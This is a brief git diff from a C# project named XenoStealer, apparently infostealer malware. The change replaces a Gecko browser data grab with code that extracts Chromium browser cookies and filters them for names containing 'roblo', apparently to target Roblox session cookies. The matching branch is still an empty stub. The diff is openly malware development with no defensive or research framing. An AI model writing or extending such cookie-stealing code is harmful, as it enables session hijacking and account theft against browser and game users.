@@ -13,7 +13,14 @@ namespace XenoStealer
     {
         public static void Main(string[] args)
         {
-            var f = Gecko.GetAllInfo(DataExtractionStructs.GeckoBrowserOptions.All);
+            var f = Chromium.GetAllInfo(DataExtractionStructs.ChromiumBrowserOptions.Cookies);
+            foreach (DataExtractionStructs.ChromiumCookie i in f[0].profiles[0].cookies) 
+            {
+                if (i.name.ToLower().Contains("roblo")) 
+                {
+                    var c = "";
+                }
+            }
             var d = "";
         }
     }
